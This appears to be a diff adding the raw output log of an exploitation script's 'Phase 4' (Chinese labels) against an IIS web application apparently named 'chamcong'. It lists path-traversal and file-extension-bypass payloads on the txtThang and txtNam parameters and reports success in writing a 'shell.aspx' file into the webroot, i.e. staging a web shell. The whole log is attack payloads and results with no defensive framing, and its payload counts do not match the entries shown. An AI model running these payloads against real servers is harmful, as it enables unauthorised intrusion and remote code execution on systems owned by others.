@@ -1,0 +1,187 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 Phase 4: 文件写入漏洞深度利用
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] 路径遍历测试 - txtThang参数
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  [1/16] txtThang='11'
+    路径: C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [2/16] txtThang='../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [3/16] txtThang='../../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [4/16] txtThang='../../../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [5/16] txtThang='../../../../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [6/16] txtThang='../../../../../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [7/16] txtThang='../../../../../../inetpub/wwwroot/chamcong/shell'
+    路径: C:\inetpub\wwwroot\chamcong\shell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 路径遍历成功！突破TEMP目录！
+
+  [8/16] txtThang='11/../../../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [9/16] txtThang='11/../../shell'
+    大小: 2750 bytes (无错误信息)
+
+  [10/16] txtThang='..\shell'
+    大小: 2750 bytes (无错误信息)
+
+  [11/16] txtThang='..\..\shell'
+    大小: 2750 bytes (无错误信息)
+
+  [12/16] txtThang='..\..\..\inetpub\wwwroot\chamcong\shell'
+    路径: C:\inetpub\wwwroot\chamcong\shell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 路径遍历成功！突破TEMP目录！
+
+  [13/16] txtThang='%2e%2e%2fshell'
+    路径: C:\TEMP\%2e%2e%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\%2e%2e%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\%2e%2e%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [14/16] txtThang='%2e%2e%2f%2e%2e%2fshell'
+    路径: C:\TEMP\%2e%2e%2f%2e%2e%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\%2e%2e%2f%2e%2e%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\%2e%2e%2f%2e%2e%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [15/16] txtThang='..%2fshell'
+    路径: C:\TEMP\..%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\..%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\..%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [16/16] txtThang='11%2f..%2f..%2fshell'
+    路径: C:\TEMP\11%2f..%2f..%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\11%2f..%2f..%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\11%2f..%2f..%2fshell2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[2] 文件扩展名绕过 - txtNam参数
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  [1/11] txtNam='2025'
+    路径: C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [2/11] txtNam='2025.aspx'
+    路径: C:\TEMP\112025.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+  [3/11] txtNam='2025.aspx%00'
+    路径: C:\TEMP\112025.aspx%00_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx%00_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx%00_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+  [4/11] txtNam='2025.aspx%00.xls'
+    路径: C:\TEMP\112025.aspx%00.xls_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx%00.xls_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx%00.xls_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+  [5/11] txtNam='2025.aspx;.xls'
+    路径: C:\TEMP\112025.aspx;.xls_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx;.xls_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.aspx;.xls_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+  [6/11] txtNam='2025.asp'
+    路径: C:\TEMP\112025.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+  [7/11] txtNam='2025.cer'
+    路径: C:\TEMP\112025.cer_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.cer_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025.cer_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [8/11] txtNam='2025.aspx::.xls'
+    大小: 7765 bytes (无错误信息)
+
+  [9/11] txtNam='2025\x00.aspx'
+    路径: C:\TEMP\112025\x00.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025\x00.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\112025\x00.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+  [10/11] txtNam='aspx'
+    路径: C:\TEMP\11aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\11aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\11aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [11/11] txtNam='.aspx'
+    路径: C:\TEMP\11.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\11.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\11.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥 扩展名注入成功！
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[3] 组合攻击：路径遍历 + 扩展名绕过
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  [1/6] txtThang='../../shell' + txtNam='.aspx'
+    大小: 2750 bytes (无错误信息)
+
+  [2/6] txtThang='../../../inetpub/wwwroot/chamcong/shell' + txtNam='.aspx'
+    路径: C:\inetpub\wwwroot\chamcong\shell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥🔥🔥 完美组合！路径遍历+ASPX扩展名！
+
+  [3/6] txtThang='../../../../wwwroot/chamcong/x' + txtNam='.aspx'
+    路径: C:\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥🔥🔥🔥🔥 完美组合！路径遍历+ASPX扩展名！
+
+  [4/6] txtThang='11/../../shell' + txtNam='2025.aspx'
+    大小: 2750 bytes (无错误信息)
+
+  [5/6] txtThang='....shell' + txtNam='.aspx'
+    路径: C:\TEMP\....shell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\....shell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\....shell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥 扩展名注入成功
+
+  [6/6] txtThang='......inetpubwwwrootchamcongshell' + txtNam='.aspx'
+    路径: C:\TEMP\......inetpubwwwrootchamcongshell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\......inetpubwwwrootchamcongshell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\TEMP\......inetpubwwwrootchamcongshell.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+    🔥 扩展名注入成功
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[4] ID参数测试（不同报表可能有不同处理）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试 ID=BC01 + 路径遍历...
+
+  测试 ID=BC02 + 路径遍历...
+
+  测试 ID=BC03 + 路径遍历...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Phase 4 完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 结果总结:
+  - 路径遍历测试: 21 个payload
+  - 扩展名绕过: 30 个payload
+
+🔥 关键发现:
